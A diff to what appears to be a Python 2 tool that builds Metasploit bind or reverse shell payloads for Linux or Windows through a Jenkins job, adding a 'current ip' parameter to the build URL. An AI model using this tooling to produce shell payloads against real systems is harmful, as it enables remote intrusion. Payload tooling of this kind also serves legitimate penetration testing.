@@ -18,6 +18,8 @@ parser.add_argument('o', help='OS type: 0 = Linux/x86, 1 = Windows/x86', type=in
 parser.add_argument('pay', help='payload type: 0 = MSF TCP Bind (requires -port), 1 = MSF TCP Reverse (requires -rip & -port)', type=int)
 parser.add_argument('port', help='MSF TCP Bind/Reverse Shell Port Number', type=int)
 parser.add_argument('rip', help='MSF TCP reverse payload IP address')
+parser.add_argument('cip', help='current ip address')
+
 
 args = parser.parse_args()
 
@@ -33,6 +35,7 @@ jenkins_key = args.k
 payloadType = args.pay
 payloadPort = args.port
 payloadIP = args.rip
+cip = args.cip
 if args.pay == 1:
     if not args.rip:
         print '-rip parameter required when using MSF TCP Reverse Shell Payload'
@@ -85,7 +88,7 @@ res = urllib2.urlopen(req)
 Optionally append &cause=Cause+Text to provide text that will be included in the recorded build cause."""
 
 # trigger Jenkins job
-bulid_prams = '/job/' + jenkins_bn + '/buildWithParameters?token=' + jenkins_key + '&delay=0' +'&dir=' + uploadFileName  + '&Payload_Type=' + str(payloadType) + '&port=' + str(payloadPort) + '&IP=' +  payloadIP + '&binName=' + fileLocation + fileName
+bulid_prams = '/job/' + jenkins_bn + '/buildWithParameters?token=' + jenkins_key + '&delay=0' +'&dir=' + uploadFileName  + '&Payload_Type=' + str(payloadType) + '&port=' + str(payloadPort) + '&IP=' +  payloadIP + '&binName=' + fileLocation + fileName + '&cip=' + cip
 jenkins_url = jenkinsIP + bulid_prams
 print '[*] Jenkins URL ' + jenkins_url
 
